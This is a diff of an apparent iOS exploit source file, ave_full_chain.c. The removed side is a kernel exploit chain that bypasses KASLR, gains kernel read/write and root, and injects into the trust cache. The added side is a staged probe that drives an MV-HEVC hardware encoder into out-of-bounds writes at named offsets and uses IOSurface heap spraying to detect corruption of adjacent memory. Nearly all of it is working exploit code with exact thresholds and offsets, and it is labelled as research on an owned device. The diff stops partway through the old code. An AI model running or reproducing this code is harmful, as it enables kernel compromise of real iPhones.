@@ -1,565 +1,572 @@
 /*
- * ave_full_chain.c — Combined AVE DMA OOB Exploit Chain
+ * ave_full_chain.c — CVE-2026-114025 + CVE-2026-112465 Full Chain Probe
  *
- * Combines all primitives into a single exploit flow:
- *   1. KASLR bypass via IOSurface property corruption
- *   2. Kernel R/W via pipe buffer corruption
- *   3. Root via ucred cr_uid/cr_gid overwrite
- *   4. Trust cache injection for code signing bypass
+ * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
  *
- * Each step is independently testable via modes. The "chain" mode
- * runs all steps in sequence.
+ * This probe runs the COMPLETE exploitation sequence:
+ * 1. Verify MV-HEVC support
+ * 2. Measure NAL sizes and cumsum growth rate
+ * 3. Test counter overflow survivability
+ * 4. Test OOB READ (CVE-2026-112465) for kernel heap info leak
+ * 5. Test firmware parameter corruption (+0x5ED4 -> 56-byte header overwrite)
+ * 6. Test cross-buffer OOB with IOSurface spray
  *
- * EDUCATIONAL / AUTHORIZED RESEARCH USE ONLY
+ * Key thresholds (all entries from first VPS table at buffer+0x3770):
+ *   Entry 256 (~86 encodes): First OOB write
+ *   Entry 602 (~201 encodes): Guard array +0x5D14 (branch misroute)
+ *   Entry 630 (~210 encodes): Cross-object 56-byte write (+0x5ED4)
+ *   Entry 642 (~214 encodes): Forced BLRAA (+0x5F94)
+ *   Entry 714 (~238 encodes): W24 config override (+0x6414)
+ *   Entry 1059 (~353 encodes): Cross-buffer OOB (adjacent kalloc.49152)
  *
- * Build:
- *   xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
- *     -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
- *     -framework CoreFoundation -framework IOSurface -framework IOKit \
- *     -o ave_full_chain ave_full_chain.c -Wno-deprecated-declarations
+ * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
+ *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
+ *        -framework CoreFoundation -framework IOSurface -framework IOKit
+ *        -o AVEFullChain ave_full_chain.c -Wno-deprecated-declarations
  *
- * Deployed as: AVEChain.app (com.research.avechain)
+ * Bundle ID: com.research.avefullchain
  */
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <sys/sysctl.h>
-#include <sys/mman.h>
 #include <mach/mach.h>
-#include <signal.h>
-#include <spawn.h>
-extern int csops(pid_t pid, unsigned int ops, void *useraddr, size_t usersize);
+#include <CoreFoundation/CoreFoundation.h>
 #include <VideoToolbox/VideoToolbox.h>
 #include <CoreVideo/CoreVideo.h>
-#include <CoreMedia/CoreMedia.h>
 
 typedef struct __IOSurface *IOSurfaceRef;
 typedef uint32_t IOSurfaceID;
 extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
 extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
-extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
 extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);
 extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
 extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
 extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
 extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
 
-static FILE *out;
-static volatile int g_signal = 0;
-static void sig_handler(int sig) { g_signal = sig; }
+static FILE *g_log = NULL;
+static volatile int g_encode_done = 0;
+static volatile OSStatus g_cb_status = -999;
+static volatile int g_cb_count = 0;
+static volatile size_t g_last_pset_count = 0;
+static volatile size_t g_last_pset_total_bytes = 0;
 
-static void p(const char *fmt, ...) {
-    va_list ap; va_start(ap, fmt); vfprintf(out, fmt, ap); va_end(ap); fflush(out);
+static void rlog(const char *fmt, ...) {
+    va_list ap;
+    va_start(ap, fmt);
+    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
+    va_end(ap);
+    va_start(ap, fmt);
+    vprintf(fmt, ap);
+    fflush(stdout);
+    va_end(ap);
 }
 
-#define SPRAY_COUNT 512
-#define PIPE_COUNT 256
-#define HOLE_STRIDE 4
+static void encode_cb(void *ctx, void *src, OSStatus status,
+                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
+    g_cb_status = status;
+    g_cb_count++;
+    g_encode_done = 1;
+
+    if (buf && status == 0) {
+        CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(buf);
+        if (fmt) {
+            size_t pset_count = 0;
+            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                fmt, 0, NULL, NULL, &pset_count, NULL);
+            g_last_pset_count = pset_count;
+
+            size_t total = 0;
+            for (size_t i = 0; i < pset_count && i < 1000; i++) {
+                size_t sz = 0;
+                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                    fmt, i, NULL, &sz, NULL, NULL);
+                total += sz;
+            }
+            g_last_pset_total_bytes = total;
+        }
+    }
+}
+
+static CVPixelBufferRef create_pb(int w, int h) {
+    CVPixelBufferRef pb = NULL;
+    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
+        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
+    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
+    CFRelease(iosurf); CFRelease(attrs);
+    if (ret != kCVReturnSuccess) return NULL;
+    CVPixelBufferLockBaseAddress(pb, 0);
+    void *base = CVPixelBufferGetBaseAddress(pb);
+    if (base) memset(base, 0x42, w * h * 4);
+    CVPixelBufferUnlockBaseAddress(pb, 0);
+    return pb;
+}
+
+static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id) {
+    VTCompressionSessionRef session = NULL;
+    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                         kCFBooleanTrue);
+    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
+                         kCFBooleanTrue);
+
+    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
+        encode_cb, NULL, &session);
+    CFRelease(enc_spec);
+    if (st != noErr || !session) return NULL;
+
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+    int kf = 1;
+    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
+    CFRelease(kfn);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+
+    int base = 0;
+    CFNumberRef ids[2];
+    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
+    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
+    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
+    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
+    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);
+
+    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
+    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
+    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
+    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
+    CFRelease(left); CFRelease(right);
+
+    st = VTCompressionSessionPrepareToEncodeFrames(session);
+    if (st != noErr) {
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+        return NULL;
+    }
+    return session;
+}
+
+static int encode_one(VTCompressionSessionRef session, int frame_idx, int w, int h) {
+    CVPixelBufferRef pb = create_pb(w, h);
+    if (!pb) return -1;
+    g_encode_done = 0;
+    g_cb_status = -999;
+    CMTime pts = CMTimeMake(frame_idx, 30);
+    CMTime dur = CMTimeMake(1, 30);
+    OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
+    if (st != noErr) { CVPixelBufferRelease(pb); return (int)st; }
+    for (int i = 0; i < 100 && !g_encode_done; i++) usleep(10000);
+    CVPixelBufferRelease(pb);
+    return (int)g_cb_status;
+}
+
+/* Phase 1: Verify MV-HEVC */
+static int phase1_verify(void) {
+    rlog("\n========== PHASE 1: MV-HEVC Support ==========\n");
+    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+    if (!s) {
+        rlog("FAILED: MV-HEVC not supported on this device\n");
+        rlog("MV-HEVC requires iPhone 15 Pro or later.\n");
+        return -1;
+    }
+    int st = encode_one(s, 0, 128, 128);
+    rlog("First encode: status=%d, pset_count=%zu\n", st, g_last_pset_count);
+    VTCompressionSessionInvalidate(s); CFRelease(s);
+    if (st != 0) {
+        rlog("FAILED: Encode error %d\n", st);
+        return -1;
+    }
+    rlog("PASS: MV-HEVC encoder works, %zu parameter sets per frame\n", g_last_pset_count);
+    return 0;
+}
+
+/* Phase 2: Measure NAL sizes and cumsum growth */
+static int phase2_measure(void) {
+    rlog("\n========== PHASE 2: NAL Size Measurement ==========\n");
+    rlog("Each MV-HEVC encode produces ~3 NAL entries (VPS+SPS+PPS)\n");
+    rlog("Entry format: [NAL_type(4), layer_id(4), cumsum(4), data>>3(4)]\n");
+    rlog("OOB starts when counter > 256 entries (~86 encodes)\n\n");
+
+    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+    if (!s) return -1;
+
+    for (int i = 0; i < 10; i++) {
+        int st = encode_one(s, i, 128, 128);
+        rlog("[%d] status=%d, psets=%zu, total_bytes=%zu\n",
+             i, st, g_last_pset_count, g_last_pset_total_bytes);
+        if (st != 0) break;
+    }
+    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+    usleep(500000);
+    VTCompressionSessionInvalidate(s); CFRelease(s);
+
+    rlog("\nExpected: ~3 entries/encode, cumsum grows ~0.25/entry at 128x128\n");
+    rlog("Cumsum limit: 0x801 (2049) — small frames stay well under\n");
+    return 0;
+}
+
+/* Phase 3: Counter overflow */
+static int phase3_overflow(int max_encodes) {
+    rlog("\n========== PHASE 3: Counter Overflow (%d encodes) ==========\n", max_encodes);
+    rlog("OOB entry thresholds:\n");
+    rlog("  256 (~86 enc): First write past VPS sub-object boundary\n");
+    rlog("  602 (~201 enc): +0x5D14 guard array (branch misroute)\n");
+    rlog("  630 (~210 enc): +0x5ED4 56-byte SIMD header overwrite\n");
+    rlog("  642 (~214 enc): +0x5F94 forced BLRAA indirect call\n");
+    rlog("  714 (~238 enc): +0x6414 W24 config override\n\n");
+
+    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+    if (!s) return -1;
+
+    int first_error = -1;
+    int errors = 0;
+    for (int i = 0; i < max_encodes; i++) {
+        int st = encode_one(s, i, 128, 128);
+        if (st != 0) {
+            if (first_error < 0) first_error = i;
+            errors++;
+            rlog("[%d] ERROR: %d (total errors: %d)\n", i, st, errors);
+            if (errors >= 10) {
+                rlog("Too many errors, stopping\n");
+                break;
+            }
+        }
+        if ((i+1) % 25 == 0 || i == max_encodes-1) {
+            int est_entries = (i+1) * 3;
+            rlog("[%d/%d] psets=%zu, bytes=%zu, errors=%d, ~%d entries (OOB: %s)\n",
+                 i+1, max_encodes, g_last_pset_count, g_last_pset_total_bytes, errors,
+                 est_entries, est_entries > 256 ? "YES" : "no");
+        }
+    }
+
+    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+    usleep(500000);
+    VTCompressionSessionInvalidate(s); CFRelease(s);
+
+    if (first_error >= 0)
+        rlog("\nFIRST ERROR at encode %d (~%d entries)\n", first_error, first_error * 3);
+    else
+        rlog("\nALL %d ENCODES SUCCEEDED — OOB corruption occurred SILENTLY\n", max_encodes);
+
+    return errors;
+}
+
+/* Phase 4: OOB Read test (CVE-2026-112465) */
+static int phase4_oob_read(int encodes) {
+    rlog("\n========== PHASE 4: OOB Read (CVE-2026-112465) ==========\n");
+    rlog("After counter overflow, READ path at 0x18a9610 iterates past boundary\n");
+    rlog("CMVideoFormatDescriptionGetHEVCParameterSetAtIndex may return heap data\n");
+    rlog("Encoding %d frames, tracking parameter set count/size changes\n\n", encodes);
+
+    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
+    if (!s) return -1;
+
+    size_t baseline_count = 0, baseline_bytes = 0;
+    size_t max_count = 0, max_bytes = 0;
+    for (int i = 0; i < encodes; i++) {
+        int st = encode_one(s, i, 128, 128);
+        if (i == 0) {
+            baseline_count = g_last_pset_count;
+            baseline_bytes = g_last_pset_total_bytes;
+            rlog("Baseline: psets=%zu, bytes=%zu\n", baseline_count, baseline_bytes);
+        }
+        if (g_last_pset_count > max_count) max_count = g_last_pset_count;
+        if (g_last_pset_total_bytes > max_bytes) max_bytes = g_last_pset_total_bytes;
+        if (st != 0) {
+            rlog("[%d] Error: %d\n", i, st);
+            break;
+        }
+        if ((i+1) % 50 == 0 || i == encodes-1)
+            rlog("[%d] psets=%zu (max=%zu), bytes=%zu (max=%zu)\n",
+                 i+1, g_last_pset_count, max_count, g_last_pset_total_bytes, max_bytes);
+    }
+
+    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+    usleep(500000);
+
+    rlog("\nFinal: psets=%zu (baseline=%zu, max=%zu)\n",
+         g_last_pset_count, baseline_count, max_count);
+    rlog("       bytes=%zu (baseline=%zu, max=%zu)\n",
+         g_last_pset_total_bytes, baseline_bytes, max_bytes);
+
+    if (max_count > baseline_count) {
+        rlog("*** OOB READ DETECTED: pset count grew from %zu to %zu ***\n",
+             baseline_count, max_count);
+        rlog("*** Extra entries contain KERNEL HEAP DATA ***\n");
+    } else if (max_bytes > baseline_bytes * 2) {
+        rlog("*** POSSIBLE OOB READ: total bytes grew significantly ***\n");
+    } else {
+        rlog("No obvious OOB read detected in parameter set metadata\n");
+        rlog("Note: read path may use separate counter or clamp differently\n");
+    }
+
+    VTCompressionSessionInvalidate(s); CFRelease(s);
+    return 0;
+}
+
+/* Phase 5: Firmware parameter corruption with controlled layer_id */
+static int phase5_firmware(int encodes, int layer_id) {
+    rlog("\n========== PHASE 5: Firmware Param Corruption ==========\n");
+    rlog("Target: %d encodes with layer_id=%d (0x%x)\n", encodes, layer_id, layer_id);
+    rlog("layer_id is written at byte position 4 of each 16-byte entry\n");
+    rlog("All key targets at byte 4 = layer_id = FULLY CONTROLLED:\n");
+    rlog("  +0x5D14 (entry 602): guard array — layer_id misroutes params\n");
+    rlog("  +0x5ED4 (entry 630): 56-byte SIMD overwrite source\n");
+    rlog("  +0x5F94 (entry 642): nonzero forces BLRAA indirect call\n");
+    rlog("  +0x6414 (entry 714): W24 config override\n\n");
+
+    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, layer_id);
+    if (!s) return -1;
+
+    int errors = 0;
+    for (int i = 0; i < encodes; i++) {
+        int st = encode_one(s, i, 128, 128);
+        if (st != 0) {
+            errors++;
+            rlog("[%d] Error: %d\n", i, st);
+            if (errors >= 5) break;
+        }
+        if ((i+1) % 25 == 0 || i == encodes-1) {
+            int est_entries = (i+1) * 3;
+            const char *target = "pre-OOB";
+            if (est_entries >= 714) target = "+0x6414 W24 REACHED";
+            else if (est_entries >= 642) target = "+0x5F94 BLRAA REACHED";
+            else if (est_entries >= 630) target = "+0x5ED4 SIMD REACHED";
+            else if (est_entries >= 602) target = "+0x5D14 guard REACHED";
+            else if (est_entries >= 256) target = "OOB active";
+            rlog("[%d/%d] status=%d, ~%d entries, %s\n",
+                 i+1, encodes, (int)g_cb_status, est_entries, target);
+        }
+    }
+
+    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+    usleep(500000);
+
+    rlog("\nPost-corruption test encode...\n");
+    int st = encode_one(s, encodes, 128, 128);
+    rlog("Post-corruption: status=%d\n", st);
+
+    VTCompressionSessionInvalidate(s); CFRelease(s);
+
+    if (errors == 0)
+        rlog("ALL %d ENCODES SUCCEEDED — firmware params silently corrupted\n", encodes);
+    return errors;
+}
+
+/* Phase 6: IOSurface spray + encode for cross-buffer corruption detection */
+#define SPRAY_COUNT 64
 
 static IOSurfaceRef g_surfaces[SPRAY_COUNT];
-static int g_pipes[PIPE_COUNT][2];
 
-static int g_krw_pipe_r = -1;
-static int g_krw_pipe_w = -1;
-static uint64_t g_kaslr_slide = 0;
-static uint64_t g_kernel_base = 0;
-
-static IOSurfaceRef create_tagged_surface(int idx) {
+static IOSurfaceRef create_spray_surface(int idx) {
+    int alloc = 36864;
     CFMutableDictionaryRef props = CFDictionaryCreateMutable(
-        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-    int w = 64, h = 64, bpr = 256, alloc = 16384, fmt = 0x42475241;
-    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
-    CFNumberRef nh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &h);
-    CFNumberRef nbpr = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &bpr);
-    CFNumberRef nalloc = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &alloc);
-    CFNumberRef nfmt = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &fmt);
+        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 96, h = 96, bpr = 384;
+    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nalloc = CFNumberCreate(NULL, kCFNumberIntType, &alloc);
+    int fmt = 0x42475241;
+    CFNumberRef nfmt = CFNumberCreate(NULL, kCFNumberIntType, &fmt);
     CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
     CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
     CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
     CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
     CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);
-
     IOSurfaceRef surf = IOSurfaceCreate(props);
     CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc);
     CFRelease(nfmt); CFRelease(props);
     if (surf) {
-        uint64_t sentinel = 0xDEAD000000000000ULL | ((uint64_t)idx << 16) | (idx & 0xFFFF);
-        CFNumberRef nsen = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &sentinel);
-        IOSurfaceSetValue(surf, CFSTR("Sentinel"), nsen);
+        uint32_t tag = 0x53505259;
+        CFNumberRef nsen = CFNumberCreate(NULL, kCFNumberIntType, &tag);
+        IOSurfaceSetValue(surf, CFSTR("SprayTag"), nsen);
         CFRelease(nsen);
         IOSurfaceLock(surf, 0, NULL);
         void *base = IOSurfaceGetBaseAddress(surf);
         if (base) {
+            memset(base, 0xAA, alloc);
             uint32_t *p32 = (uint32_t *)base;
-            uint32_t tag = 0xCAFE0000 | (idx & 0xFFFF);
-            for (int j = 0; j < (int)(alloc / sizeof(uint32_t)); j++)
-                p32[j] = tag;
+            p32[0] = tag;
+            p32[1] = (uint32_t)idx;
+            for (int m = 4096; m < alloc; m += 4096) {
+                p32[m/4] = 0xBEAC0000 | (idx & 0xFFFF);
+            }
         }
         IOSurfaceUnlock(surf, 0, NULL);
     }
     return surf;
 }
 
-static int check_backing_memory(IOSurfaceRef surf, int idx) {
-    IOSurfaceLock(surf, 1, NULL);
-    void *base = IOSurfaceGetBaseAddress(surf);
-    if (!base) { IOSurfaceUnlock(surf, 1, NULL); return 0; }
-    uint32_t *p32 = (uint32_t *)base;
-    uint32_t tag = 0xCAFE0000 | (idx & 0xFFFF);
-    int alloc = 16384;
+static int phase6_spray(int encodes) {
+    rlog("\n========== PHASE 6: IOSurface Spray + OOB ==========\n");
+    rlog("Spray %d IOSurfaces (36864 bytes each = kalloc.49152)\n", SPRAY_COUNT);
+    rlog("HEVC buffer is ~39696 bytes in kalloc.49152 (or kalloc_data)\n");
+    rlog("If HEVC buffer lands adjacent, OOB past entry 1059 (~353 enc)\n");
+    rlog("corrupts next allocation\n\n");
+
+    rlog("Phase 6a: Pre-spray %d surfaces\n", SPRAY_COUNT/2);
+    for (int i = 0; i < SPRAY_COUNT/2; i++)
+        g_surfaces[i] = create_spray_surface(i);
+
+    rlog("Phase 6b: Create encoder (allocates HEVC buffer)\n");
+    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 0x4141);
+    if (!s) {
+        rlog("FAILED: Could not create encoder\n");
+        for (int i = 0; i < SPRAY_COUNT/2; i++)
+            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
+        return -1;
+    }
+
+    rlog("Phase 6c: Post-spray %d more surfaces\n", SPRAY_COUNT/2);
+    for (int i = SPRAY_COUNT/2; i < SPRAY_COUNT; i++)
+        g_surfaces[i] = create_spray_surface(i);
+
+    rlog("Phase 6d: Encode %d frames (need ~353 for cross-buffer)\n", encodes);
+    int errors = 0;
+    for (int i = 0; i < encodes; i++) {
+        int st = encode_one(s, i, 128, 128);
+        if (st != 0) {
+            errors++;
+            rlog("[%d] Error: %d\n", i, st);
+            if (errors >= 5) break;
+        }
+        if ((i+1) % 50 == 0 || i == encodes-1) {
+            int est_entries = (i+1) * 3;
+            rlog("[%d/%d] ~%d entries, cross-buffer: %s\n",
+                 i+1, encodes, est_entries,
+                 est_entries > 1059 ? "REACHED" : "not yet");
+        }
+    }
+
+    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
+    usleep(500000);
+
+    rlog("\nPhase 6e: Check spray surfaces for corruption\n");
     int corrupted = 0;
-    int first_off = -1;
-    uint32_t first_val = 0;
-    for (int j = 0; j < (int)(alloc / sizeof(uint32_t)); j++) {
-        if (p32[j] != tag) {
-            if (!corrupted) { first_off = j; first_val = p32[j]; }
-            corrupted++;
-        }
-    }
-    IOSurfaceUnlock(surf, 1, NULL);
-    if (corrupted) {
-        p("  !! BACKING MEMORY CORRUPTED surf[%d]: %d words changed, "
-          "first at +0x%x = 0x%08x (expected 0x%08x)\n",
-          idx, corrupted, first_off * 4, first_val, tag);
-        IOSurfaceLock(surf, 1, NULL);
-        base = IOSurfaceGetBaseAddress(surf);
+    for (int i = 0; i < SPRAY_COUNT; i++) {
+        if (!g_surfaces[i]) continue;
+        IOSurfaceLock(g_surfaces[i], 1, NULL);
+        void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
         if (base) {
-            p32 = (uint32_t *)base;
-            int start = first_off > 2 ? first_off - 2 : 0;
-            int end = first_off + 10 < (int)(alloc / sizeof(uint32_t)) ? first_off + 10 : (int)(alloc / sizeof(uint32_t));
-            for (int k = start; k < end; k++)
-                p("    [+0x%04x] 0x%08x%s\n", k * 4, p32[k],
-                  p32[k] != tag ? " *" : "");
-            uint64_t fv64 = *(uint64_t *)&p32[first_off];
-            if ((fv64 & 0xFFFFFE0000000000ULL) == 0xFFFFFE0000000000ULL)
-                p("  *** POSSIBLE KERNEL POINTER IN BACKING MEMORY ***\n");
+            uint32_t *p32 = (uint32_t *)base;
+            int changes = 0;
+            for (int j = 2; j < 9216; j++) {
+                if (p32[j] != 0xAAAAAAAA) {
+                    if (!changes) {
+                        rlog("  SURFACE[%d] CORRUPTED at +0x%x: 0x%08x (expected 0xAAAAAAAA)\n",
+                             i, j*4, p32[j]);
+                        for (int k = (j>2?j-2:0); k < j+8 && k < 9216; k++)
+                            rlog("    [+0x%04x] 0x%08x%s\n", k*4, p32[k],
+                                 p32[k] != 0xAAAAAAAA ? " *" : "");
+                    }
+                    changes++;
+                }
+            }
+            if (changes) {
+                corrupted++;
+                rlog("  Surface[%d]: %d words changed\n", i, changes);
+            }
         }
-        IOSurfaceUnlock(surf, 1, NULL);
+        IOSurfaceUnlock(g_surfaces[i], 1, NULL);
     }
+
+    rlog("\nCorrupted surfaces: %d / %d\n", corrupted, SPRAY_COUNT);
+    if (corrupted > 0)
+        rlog("*** CROSS-BUFFER OOB INTO ADJACENT ALLOCATION CONFIRMED ***\n");
+
+    VTCompressionSessionInvalidate(s); CFRelease(s);
+    for (int i = 0; i < SPRAY_COUNT; i++)
+        if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
     return corrupted;
 }
 
-static void encode_cb(void *ref, void *buf, OSStatus st,
-                       VTEncodeInfoFlags flags, CMSampleBufferRef sb) {
-    (*(int *)ref)++;
-}
-
-static int do_encode(int ntl, int frames, uint8_t pixel_fill) {
-    p("  [encode] NTL=%d frames=%d fill=0x%02x\n", ntl, frames, pixel_fill);
-    CFMutableDictionaryRef sa = CFDictionaryCreateMutable(
-        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-    CFDictionaryRef iop = CFDictionaryCreate(
-        kCFAllocatorDefault, NULL, NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-    CFDictionarySetValue(sa, kCVPixelBufferIOSurfacePropertiesKey, iop);
-    CFRelease(iop);
-    int pixfmt = kCVPixelFormatType_32BGRA;
-    CFNumberRef fn = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &pixfmt);
-    CFDictionarySetValue(sa, kCVPixelBufferPixelFormatTypeKey, fn); CFRelease(fn);
-
-    int cb = 0;
-    VTCompressionSessionRef sess = NULL;
-    OSStatus st = VTCompressionSessionCreate(
-        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
-        NULL, sa, NULL, encode_cb, &cb, &sess);
-    CFRelease(sa);
-    if (st || !sess) return -1;
-
-    VTSessionSetProperty(sess, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
-    CFNumberRef n; int v;
-    v = 1; n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &v);
-    VTSessionSetProperty(sess, CFSTR("EncoderUsage"), n); CFRelease(n);
-    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &ntl);
-    VTSessionSetProperty(sess, CFSTR("NumberOfTemporalLayers"), n); CFRelease(n);
-
-    st = VTCompressionSessionPrepareToEncodeFrames(sess);
-    if (st) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -1; }
-
-    CVPixelBufferPoolRef pool = VTCompressionSessionGetPixelBufferPool(sess);
-    if (!pool) { VTCompressionSessionInvalidate(sess); CFRelease(sess); return -2; }
-
-    for (int i = 0; i < frames; i++) {
-        if (g_signal) break;
-        CVPixelBufferRef pb = NULL;
-        CVPixelBufferPoolCreatePixelBuffer(kCFAllocatorDefault, pool, &pb);
-        if (!pb) break;
-        CVPixelBufferLockBaseAddress(pb, 0);
-        void *base = CVPixelBufferGetBaseAddress(pb);
-        if (base) memset(base, pixel_fill, CVPixelBufferGetDataSize(pb));
-        CVPixelBufferUnlockBaseAddress(pb, 0);
-        st = VTCompressionSessionEncodeFrame(sess, pb, CMTimeMake(i, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
-        CVPixelBufferRelease(pb);
-        if (st) break;
-    }
-    VTCompressionSessionCompleteFrames(sess, kCMTimeInvalid);
-    p("  [encode] callbacks: %d\n", cb);
-    VTCompressionSessionInvalidate(sess); CFRelease(sess);
-    return cb;
-}
-
-static uint64_t step_kaslr_bypass(void) {
-    p("\n=== Step 1: DMA OOB Detection + KASLR Bypass ===\n");
-    p("  Strategy: fill IOSurface BACKING MEMORY with known pattern,\n");
-    p("  trigger DMA OOB, check if backing memory changed.\n");
-    p("  DMA writes to physical pages (kmem_alloc), NOT kalloc properties.\n\n");
-    uint64_t leaked = 0;
-    int total_corrupted_surfs = 0;
-
-    for (int round = 0; round < 10 && !leaked; round++) {
-        p("  Round %d...\n", round);
-        for (int i = 0; i < SPRAY_COUNT; i++)
-            g_surfaces[i] = create_tagged_surface(i);
-
-        for (int i = 0; i < SPRAY_COUNT; i += HOLE_STRIDE)
-            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
-
-        do_encode(9, 3, 0x00);
-        usleep(100000);
-
-        int round_hits = 0;
-        for (int i = 0; i < SPRAY_COUNT; i++) {
-            if (!g_surfaces[i]) continue;
-            int ncorr = check_backing_memory(g_surfaces[i], i);
-            if (ncorr > 0) {
-                round_hits++;
-                total_corrupted_surfs++;
-                IOSurfaceLock(g_surfaces[i], 1, NULL);
-                void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
-                if (base) {
-                    uint64_t *p64 = (uint64_t *)base;
-                    for (int j = 0; j < 2048; j++) {
-                        uint64_t v = p64[j];
-                        if ((v & 0xFFFFFE0000000000ULL) == 0xFFFFFE0000000000ULL
-                            && (v & 0xFFF) == 0) {
-                            p("  *** KERNEL POINTER in surf[%d]+0x%x: 0x%016llx ***\n",
-                              i, j * 8, (unsigned long long)v);
-                            if (!leaked) leaked = v;
-                        }
-                    }
-                }
-                IOSurfaceUnlock(g_surfaces[i], 1, NULL);
-            }
-        }
